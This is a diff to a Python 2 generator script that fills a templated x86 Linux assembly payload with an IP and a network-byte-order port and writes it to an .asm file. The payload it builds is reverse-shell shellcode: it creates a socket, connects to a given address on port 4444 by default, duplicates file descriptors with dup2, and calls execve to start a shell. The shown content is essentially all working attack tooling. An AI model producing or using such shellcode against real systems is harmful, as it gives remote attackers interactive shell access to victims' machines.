@@ -188,6 +188,16 @@ PrintableEndianRequest = ''.join(EndianRequest)
 
 #print PrintableEndianRequest
 
+# Let's convert the port
+
+x = hex( int (LPort) )[2:]
+encodedport = "0x"+ "".join(reversed([x[i:i+2] for i in range(0, len(x), 2)]))
+
+
+
+
+
+
 
 ###### Full ASM Payload:
 PayLOAD = """
@@ -414,11 +424,11 @@ main:
 	;
 	mov al, 0x66
 
-    ;{}
+    ;
     ;mov ebp , 0x0100007f  ;sin_addr=127.1.1.1 (network byte order)
     push ebp ; Pushing our saved IP.
 	 
-	push word 0x5c11 ;sin_port=4444 (network byte order)
+	push word {}  ;0x5c11 ;sin_port=4444 (network byte order)
 	inc ebx          
 	push word bx     ;sin_family=AF_INET (0x2)
 	mov ecx, esp     ;save pointer to sockaddr struct
@@ -460,14 +470,6 @@ main:
 	int 0x80     ;exec sys_dup2
     dec ecx	 
 
-
-
-
-
-
-
-
-	;
 	; int execve(const char *filename, char *const argv[],char *const envp[]);
 	;
 	mov al, 0x0b ; syscall: sys_execve
@@ -485,7 +487,7 @@ main:
 
 
 
-""".format(PrintableEndianRequest, LPort)
+""".format(PrintableEndianRequest, encodedport)
 
 print "[+] I Am Making Your PayLoad Right Now...."
 f = open("hitriykotik.asm", "w+")
